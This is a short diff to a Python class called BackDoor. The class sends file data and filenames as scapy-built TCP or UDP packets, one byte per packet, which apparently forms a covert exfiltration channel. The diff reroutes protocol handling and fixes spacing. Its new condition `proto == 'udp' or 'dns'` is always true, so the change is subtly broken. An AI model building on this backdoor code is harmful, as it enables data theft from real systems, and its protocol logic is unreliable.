@@ -259,12 +259,11 @@ class BackDoor:
         if self.proto == "tcp":
             print(f"Now creating packet to send {binary_data, filename}")
             self.create_tcp(binary_data, filename)
-        elif self.proto == "udp":
+        elif self.proto == "udp" or "dns":
             print(f"sending {self.proto}")
             self.create_udp(binary_data, filename)
         else:
-            print(f"sending {self.proto}")
-            self.create_udp(binary_data, filename)
+           return
 
     def set_terminator(self, name: str) -> tuple[str, bytes]:
         if name:
@@ -320,7 +319,7 @@ class BackDoor:
         ip, udp = self.get_scapy_layers(src)
         for index, byte in enumerate(data):
             payload = byte
-            packet = ip / udp /  payload
+            packet = ip / udp / payload
             packets.append(packet)
 
         # Add packet to specify end of msg
